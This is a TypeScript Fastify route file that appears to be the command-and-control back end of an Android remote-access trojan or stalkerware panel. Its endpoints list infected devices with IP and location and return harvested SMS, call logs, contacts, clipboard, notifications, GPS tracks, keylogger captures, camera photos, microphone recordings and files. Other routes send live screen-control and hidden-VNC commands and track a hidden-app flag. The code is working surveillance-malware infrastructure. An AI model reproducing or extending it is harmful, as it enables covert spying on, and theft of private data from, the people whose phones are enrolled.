import type { FastifyInstance } from 'fastify';
import { getDb, dbHelpers } from '../db/index.js';
import { clients } from '../db/schema.js';
import type { clients as ClientsTable } from '../db/schema.js';
import { eq, desc } from 'drizzle-orm';
import { socketService } from '../services/socket.js';
import { CMD, SCREEN_ACTION, type CmdType } from '../types/index.js';
import { normalizePermissions, normalizeDeviceInfo, normalizeFileList } from '../utils/helpers.js';
import { requirePermission, getRequestUser } from '../middleware/auth.js';
import type { Permission } from '../types/index.js';
import { generateTurnCredentials } from '../utils/turnAuth.js';
import { log } from '../utils/logger.js';
import { isIP } from 'node:net';
import {
  cancelPendingCredentialRotation,
  deleteDeviceCredential,
  DeviceAuthError,
  provisionDevice,
  revokeDeviceCredential,
  rotateDeviceCredential,
} from '../services/deviceAuth.js';

const PAGE_PERMISSIONS: Record<string, Permission> = {
  info: 'device:view',
  sms: 'device:sms',
  calls: 'device:calls',
  contacts: 'device:contacts',
  gps: 'device:gps',
  camera: 'device:camera',
  mic: 'device:mic',
  files: 'device:files',
  wifi: 'device:wifi',
  clipboard: 'device:clipboard',
  notifications: 'device:notifications',
  permissions: 'device:permissions',
  apps: 'device:apps',
  fason: 'device:fason',
  screen: 'device:screen',
  keylogger: 'device:keylogger',
  keylogger_status: 'device:keylogger',
  downloads: 'files:download',
};

const SESSION_ID_PATTERN = /^[A-Za-z0-9._:-]{1,128}$/;
const DEVICE_ID_PATTERN = /^[A-Za-z0-9._:-]{1,128}$/;

function validPort(value: string | undefined, fallback: string): string | null {
  const parsed = Number(value || fallback);
  return Number.isInteger(parsed) && parsed > 0 && parsed <= 65535 ? String(parsed) : null;
}

function formatIceHost(host: string): string {
    if (host.startsWith('[') && host.endsWith(']')) return host;
    return host.includes(':') ? `[${host}]` : host;
}

function isValidIceHost(host: string): boolean {
  const unwrapped = host.startsWith('[') && host.endsWith(']') ? host.slice(1, -1) : host;
  if (isIP(unwrapped) !== 0) return true;
  if (unwrapped.length > 253) return false;
  return unwrapped.split('.').every(label =>
    label.length > 0
    && label.length <= 63
    && /^[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?$/.test(label)
  );
}

function isFiniteNumber(value: unknown): value is number {
  return typeof value === 'number' && Number.isFinite(value);
}

function validateRealtimeCommand(cmd: CmdType, params: Record<string, unknown>): string | null {
  const action = typeof params.action === 'string' ? params.action : '';
  const needsSession = cmd === CMD.WEBRTC_OFFER
    || cmd === CMD.WEBRTC_ICE
    || cmd === CMD.HVNC_OFFER
    || cmd === CMD.HVNC_ICE
    || (cmd === CMD.SCREEN && ['start', 'detach'].includes(action))
    || (cmd === CMD.HVNC && ['start', 'detach', 'launchApp', 'resize'].includes(action))
    || (cmd === CMD.HVNC_CTRL && action !== 'status');
  if (needsSession && (typeof params.sessionId !== 'string' || !SESSION_ID_PATTERN.test(params.sessionId))) {
    return 'Invalid WebRTC session ID';
  }
  if (cmd === CMD.WEBRTC_OFFER || cmd === CMD.HVNC_OFFER) {
    if (typeof params.sdp !== 'string' || params.sdp.length === 0 || params.sdp.length > 2_000_000) {
      return 'Invalid WebRTC offer';
    }
    if (!Array.isArray(params.iceServers) || params.iceServers.length === 0 || params.iceServers.length > 8) {
      return 'Invalid ICE server configuration';
    }
  }
  if (cmd === CMD.WEBRTC_ICE || cmd === CMD.HVNC_ICE) {
    if (typeof params.candidate !== 'string' || params.candidate.length === 0 || params.candidate.length > 16_384) {
      return 'Invalid ICE candidate';
    }
  }
  if (cmd === CMD.HVNC) {
    if (action === 'start' || action === 'resize') {
      if (params.virtualWidth !== undefined && (!isFiniteNumber(params.virtualWidth) || (params.virtualWidth as number) < 240 || (params.virtualWidth as number) > 1920)) {
        return 'Invalid virtual display width';
      }
      if (params.virtualHeight !== undefined && (!isFiniteNumber(params.virtualHeight) || (params.virtualHeight as number) < 320 || (params.virtualHeight as number) > 3840)) {
        return 'Invalid virtual display height';
      }
    }
    if (action === 'launchApp' && (typeof params.packageName !== 'string' || params.packageName.length === 0 || params.packageName.length > 255)) {
      return 'Invalid package name';
    }
  }
  if (cmd === CMD.SCREEN_CTRL || cmd === CMD.HVNC_CTRL) {
    const validActions = cmd === CMD.HVNC_CTRL
      ? ['tap', 'swipe', 'gesture', 'key', 'text', 'volume', 'touchStart', 'touchMove', 'touchEnd', 'status']
      : Object.values(SCREEN_ACTION) as string[];
    if (action && !validActions.includes(action)) return 'Invalid remote-control action';
    const touchActions: string[] = [SCREEN_ACTION.TAP, SCREEN_ACTION.TOUCH_START, SCREEN_ACTION.TOUCH_MOVE, SCREEN_ACTION.TOUCH_END, 'touchStart', 'touchMove', 'touchEnd'];
    if (touchActions.includes(action)
      && (!isFiniteNumber(params.x) || !isFiniteNumber(params.y))) {
      return 'Invalid touch coordinates';
    }
    if ((action === SCREEN_ACTION.SWIPE || action === 'swipe') &&
      (![params.startX, params.startY, params.endX, params.endY].every(isFiniteNumber))) {
      return 'Invalid swipe coordinates';
    }
    if ((action === SCREEN_ACTION.GESTURE || action === 'gesture') && (!Array.isArray(params.points) || params.points.length === 0 || params.points.length > 256
      || params.points.some((point) => !point || typeof point !== 'object'
        || !isFiniteNumber((point as Record<string, unknown>).x)
        || !isFiniteNumber((point as Record<string, unknown>).y)))) {
      return 'Invalid remote gesture';
    }
    if ((action === SCREEN_ACTION.KEY || action === 'key') && !['back', 'home', 'recents'].includes(String(params.keyCode).toLowerCase())) {
      return 'Invalid navigation key';
    }
    if ((action === SCREEN_ACTION.VOLUME || action === 'volume') && !['up', 'down', 'mute'].includes(String(params.direction).toLowerCase())) {
      return 'Invalid volume direction';
    }
    if ((action === SCREEN_ACTION.TEXT || action === 'text') && (typeof params.text !== 'string' || params.text.length > 10_000)) {
      return 'Invalid remote text input';
    }
  }
  return null;
}

export async function deviceRoutes(app: FastifyInstance) {
  app.post('/api/device/enroll', async (request, reply) => {
    const forwardedProtocol = Array.isArray(request.headers['x-forwarded-proto'])
      ? request.headers['x-forwarded-proto'][0]
      : request.headers['x-forwarded-proto'];
    const isHttps = request.protocol === 'https'
      || String(forwardedProtocol || '').split(',')[0].trim().toLowerCase() === 'https';
    if (process.env.NODE_ENV === 'production' && !isHttps) {
      return reply.code(426).send({ success: false, error: 'Device enrollment requires HTTPS' });
    }

    const body = (request.body || {}) as Record<string, unknown>;
    const bootstrapToken = typeof body.bootstrapToken === 'string' ? body.bootstrapToken.trim() : '';
    const deviceId = typeof body.deviceId === 'string' ? body.deviceId.trim() : '';
    if (bootstrapToken.length < 32 || bootstrapToken.length > 256) {
      return reply.code(400).send({ success: false, error: 'Invalid enrollment token' });
    }
    if (!DEVICE_ID_PATTERN.test(deviceId)) {
      return reply.code(400).send({ success: false, error: 'Invalid device ID' });
    }

    try {
      const deviceSecret = provisionDevice(bootstrapToken, deviceId);
      reply.header('Cache-Control', 'no-store');
      reply.header('Pragma', 'no-cache');
      return { success: true, data: { deviceSecret } };
    } catch (err: unknown) {
      if (err instanceof DeviceAuthError) {
        return reply.code(err.statusCode).send({ success: false, error: err.message });
      }
      log.error(`Device enrollment failed for ${deviceId}: ${err instanceof Error ? err.message : String(err)}`);
      return reply.code(500).send({ success: false, error: 'Device enrollment failed' });
    }
  });

  app.get('/api/clients', {
    preHandler: [app.auth, requirePermission('device:view')],
  }, async () => {
    const d = getDb();
    const allClients = d.select().from(clients).orderBy(desc(clients.online), desc(clients.lastSeen)).all();

    const formatted = allClients.map(formatClient);

    return {
      success: true,
      data: {
        clients: formatted,
        online: formatted.filter(c => c.online).length,
        offline: formatted.filter(c => !c.online).length,
        total: formatted.length,
      },
    };
  });

  app.get('/api/client/:id', {
    preHandler: [app.auth, requirePermission('device:view')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    const d = getDb();
    const client = d.select().from(clients).where(eq(clients.id, id)).get();
    if (!client) {
      return reply.code(404).send({ success: false, error: 'Client not found' });
    }
    return { success: true, data: formatClient(client) };
  });

  app.get('/api/client/:id/webrtc-config', {
    preHandler: [app.auth, async (request: any, reply: any) => {
      const user = request.user;
      if (user?.role === 'admin' || user?.permissions?.includes('device:screen') || user?.permissions?.includes('device:hvnc')) {
        return;
      }
      return reply.code(403).send({ success: false, error: 'Insufficient permissions' });
    }],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    const d = getDb();
    const client = d.select().from(clients).where(eq(clients.id, id)).get();
    if (!client) {
      return reply.code(404).send({ success: false, error: 'Client not found' });
    }

    reply.header('Cache-Control', 'no-store');
    reply.header('Pragma', 'no-cache');

    const configuredStunUrl = process.env.STUN_URL?.trim();
    const stunUrl = configuredStunUrl && /^stuns?:[^\s]+$/i.test(configuredStunUrl)
      ? configuredStunUrl
      : 'stun:stun.l.google.com:19302';
    if (configuredStunUrl && stunUrl !== configuredStunUrl) {
      log.warn('STUN_URL is invalid — using the default STUN server');
    }
    const iceServers: Array<{ urls: string | string[]; username?: string; credential?: string }> = [
      { urls: stunUrl },
    ];

    const turnHost = process.env.TURN_HOST?.trim();
    if (turnHost) {
      const turnPort = validPort(process.env.TURN_PORT, '3478');
      const secret = process.env.TURN_SECRET;
      if (!isValidIceHost(turnHost)) {
        log.warn('TURN_HOST is invalid — TURN disabled');
      } else if (!turnPort) {
        log.warn('TURN_PORT is invalid — TURN disabled');
      } else if (!secret || secret.trim().length < 32 || secret.trim().startsWith('CHANGE_ME_')) {
        log.warn('TURN_HOST set but TURN_SECRET is missing, weak, or still a placeholder — TURN disabled');
      } else {
        const creds = generateTurnCredentials(id, secret);
        const iceHost = formatIceHost(turnHost);
        const turnUrls = [
          `turn:${iceHost}:${turnPort}?transport=udp`,
          `turn:${iceHost}:${turnPort}?transport=tcp`,
        ];
        const turnTlsPort = process.env.TURN_TLS_PORT;
        if (turnTlsPort) {
          const validTlsPort = validPort(turnTlsPort, '5349');
          if (validTlsPort) turnUrls.push(`turns:${iceHost}:${validTlsPort}?transport=tcp`);
          else log.warn('TURN_TLS_PORT is invalid — TURN/TLS URL omitted');
        }
        iceServers.push({
          urls: turnUrls,
          username: creds.username,
          credential: creds.password,
        });
      }
    }

    return {
      success: true,
      data: { iceServers, turnConfigured: iceServers.some(server => {
        const urls = Array.isArray(server.urls) ? server.urls : [server.urls];
        return urls.some(url => url.startsWith('turn:') || url.startsWith('turns:'));
      }) },
    };
  });

  app.get('/api/client/:id/:page', {
    preHandler: [app.auth],
  }, async (request, reply) => {
    const { id, page } = request.params as { id: string; page: string };

    const requiredPermission = PAGE_PERMISSIONS[page];
    if (!requiredPermission) {
      return reply.code(400).send({ success: false, error: `Unknown page: ${page}` });
    }
    const user = getRequestUser(request);
    if (!user?.permissions || !user.permissions.includes(requiredPermission)) {
      return reply.code(403).send({ success: false, error: 'Insufficient permissions' });
    }

    const d = getDb();
    const client = d.select().from(clients).where(eq(clients.id, id)).get();
    if (!client) {
      return reply.code(404).send({ success: false, error: 'Client not found' });
    }
    const data = getPageData(id, page, client);
    return { success: true, data };
  });

  app.delete('/api/client/:id', {
    preHandler: [app.auth, requirePermission('device:delete')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };

    socketService.disconnectClient(id);
    socketService.setGps(id, 0);

    const d = getDb();
    d.delete(clients).where(eq(clients.id, id)).run();
    deleteDeviceCredential(id);

    dbHelpers.addLog('INFO', 'CLIENT', `Client ${id} deleted`);
    return { success: true, message: 'Client deleted' };
  });

  app.post('/api/client/:id/credential/rotate', {
    preHandler: [app.auth, requirePermission('device:command')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    if (!socketService.isClientConnected(id)) {
      return reply.code(409).send({ success: false, error: 'Device must be online to rotate its credential' });
    }

    try {
      const deviceSecret = rotateDeviceCredential(id);
      if (!socketService.deliverCredentialRotation(id, deviceSecret)) {
        cancelPendingCredentialRotation(id);
        return reply.code(409).send({ success: false, error: 'Device disconnected before rotation could be delivered' });
      }
      dbHelpers.addLog('INFO', 'SECURITY', `Credential rotation started for ${id}`);
      return { success: true, message: 'Credential rotation sent to device' };
    } catch (err: unknown) {
      if (err instanceof DeviceAuthError) {
        return reply.code(err.statusCode).send({ success: false, error: err.message });
      }
      log.error(`Credential rotation failed for ${id}: ${err instanceof Error ? err.message : String(err)}`);
      return reply.code(500).send({ success: false, error: 'Credential rotation failed' });
    }
  });

  app.post('/api/client/:id/credential/revoke', {
    preHandler: [app.auth, requirePermission('device:delete')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    if (!revokeDeviceCredential(id)) {
      return reply.code(404).send({ success: false, error: 'Active device credential not found' });
    }
    socketService.disconnectClient(id);
    dbHelpers.addLog('INFO', 'SECURITY', `Credential revoked for ${id}`);
    return { success: true, message: 'Device credential revoked' };
  });

  app.post('/api/cmd/:id/:cmd', {
    preHandler: [app.auth],
  }, async (request, reply) => {
    const { id, cmd } = request.params as { id: string; cmd: string };
    const params = (request.body || {}) as Record<string, unknown>;

    const cmdType = cmd as CmdType;
    if (!Object.values(CMD).includes(cmdType)) {
      return reply.code(400).send({ success: false, error: 'Invalid command' });
    }

    const screenCommands: CmdType[] = [CMD.SCREEN, CMD.SCREEN_CTRL, CMD.WEBRTC_OFFER, CMD.WEBRTC_ICE];
    const hvncCommands: CmdType[] = [CMD.HVNC, CMD.HVNC_CTRL, CMD.HVNC_OFFER, CMD.HVNC_ANSWER, CMD.HVNC_ICE];
    const allRealtimeCommands = [...screenCommands, ...hvncCommands];
    const user = getRequestUser(request);
    const requiredPermission: Permission = hvncCommands.includes(cmdType)
      ? 'device:hvnc'
      : screenCommands.includes(cmdType)
        ? 'device:screen'
        : 'device:command';
    if (!user.permissions?.includes(requiredPermission)) {
      return reply.code(403).send({ success: false, error: 'Insufficient command permission' });
    }

    if (allRealtimeCommands.includes(cmdType)) {
      const validationError = validateRealtimeCommand(cmdType, params);
      if (validationError) return reply.code(400).send({ success: false, error: validationError });
    }

    const sent = socketService.send(id, cmdType, params);
    return { success: true, sent, queued: !sent && !allRealtimeCommands.includes(cmdType) };
  });

  app.post('/api/gps/:id/:interval', {
    preHandler: [app.auth, requirePermission('device:gps')],
  }, async (request, reply) => {
    const { id, interval } = request.params as { id: string; interval: string };
    const intervalNum = parseInt(interval, 10);

    if (isNaN(intervalNum) || intervalNum < 0 || intervalNum > 3600) {
      return reply.code(400).send({ success: false, error: 'Interval must be between 0 and 3600 seconds' });
    }

    socketService.setGps(id, intervalNum);
    return { success: true, interval: intervalNum };
  });
}

function safeJsonParse(str: string, fallback: any = []): any {
  try { return JSON.parse(str); } catch { return fallback; }
}

function getPageData(id: string, page: string, client: any) {
  switch (page) {
    case 'info': {
      const rawInfo = client.deviceInfo ? safeJsonParse(client.deviceInfo, null) : null;
      const deviceInfo = rawInfo ? normalizeDeviceInfo(rawInfo) : null;
      return { client: formatClient(client), deviceInfo };
    }
    case 'sms': {
      const smsData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'sms'));
      return { list: Array.isArray(smsData) ? smsData : [] };
    }
    case 'calls': {
      const callsData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'calls'));
      return { list: Array.isArray(callsData) ? callsData : [] };
    }
    case 'contacts': {
      const contactsData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'contacts'));
      return { list: Array.isArray(contactsData) ? contactsData : [] };
    }
    case 'wifi': {
      const wifiData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'wifi'));
      return { list: Array.isArray(wifiData) ? wifiData : [], error: wifiData?.error || null };
    }
    case 'clipboard': {
      const clipData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'clipboard'));
      return { list: Array.isArray(clipData) ? clipData : [] };
    }
    case 'notifications': {
      const notifData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'notifications'));
      const notifStatus = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'notification_status'), null);
      return {
        list: Array.isArray(notifData) ? notifData : [],
        status: notifStatus || null,
      };
    }
    case 'permissions': {
      const rawPerms = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'permissions'));
      return { list: normalizePermissions(rawPerms) };
    }
    case 'apps': {
      const appsData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'apps'));
      return { list: Array.isArray(appsData) ? appsData : [] };
    }
    case 'gps': {
      const gpsData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'gps'));
      const gpsError = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'gps_error'), null);
      return {
        list: Array.isArray(gpsData) ? gpsData : [],
        interval: client.gpsInterval,
        error: gpsError?.error || null,
        diagnostics: gpsError?.diagnostics || null,
      };
    }
    case 'files': {
      const rawFiles = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'files'));
      const fileList = Array.isArray(rawFiles) ? normalizeFileList(rawFiles) : [];
      const fileError = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'file_error'), null);
      return { list: fileList, path: client.currentPath, error: fileError?.error || null };
    }
    case 'downloads': {
      const files = dbHelpers.getClientFiles(id, 'download');
      return { list: files };
    }
    case 'camera': {
      const rawCameras = dbHelpers.getOrCreateClientData(id, 'cameras');
      const cameras = safeJsonParse(rawCameras);
      const photos = dbHelpers.getClientFiles(id, 'photo');
      // Only report permission if cameras were actually detected (rawCameras !== '[]' means device responded)
      const camerasDetected = rawCameras !== '[]';
      return { cameras: cameras || [], photos, permission: camerasDetected ? client.cameraPermission : null };
    }
    case 'mic': {
      const recordings = dbHelpers.getClientFiles(id, 'recording');
      const micStatus = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'mic_status'));
      return { list: recordings, status: micStatus || null };
    }
    case 'fason':
      return { hidden: client.fasonHidden };
    case 'keylogger': {
      const raw = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'keylogger'));
      return { list: Array.isArray(raw) ? raw : [] };
    }
    case 'keylogger_status': {
      const raw = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'keylogger_status'));
      return raw || { enabled: null, queued: 0, checkedAt: null };
    }
    case 'keylogger_log_info': {
      const raw = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'keylogger_log_info'), null);
      return raw || { path: '', size: 0, name: '', checkedAt: null };
    }
    case 'screen':
      return {};  // WebRTC media and real-time screen state are not stored in DB.
    default:
      return { client: formatClient(client) };
  }
}

type ClientRow = typeof ClientsTable.$inferSelect;
export function formatClient(client: ClientRow) {
  return {
    id: client.id,
    ip: client.ip,
    country: client.country,
    city: client.city,
    timezone: client.timezone,
    deviceModel: client.deviceModel,
    deviceBrand: client.deviceBrand,
    deviceVersion: client.deviceVersion,
    online: !!client.online,
    firstSeen: client.firstSeen,
    lastSeen: client.lastSeen,
    reconnectCount: client.reconnectCount,
    fasonHidden: !!client.fasonHidden,
    cameraPermission: !!client.cameraPermission,
    currentPath: client.currentPath,
    gpsInterval: client.gpsInterval,
  };
}
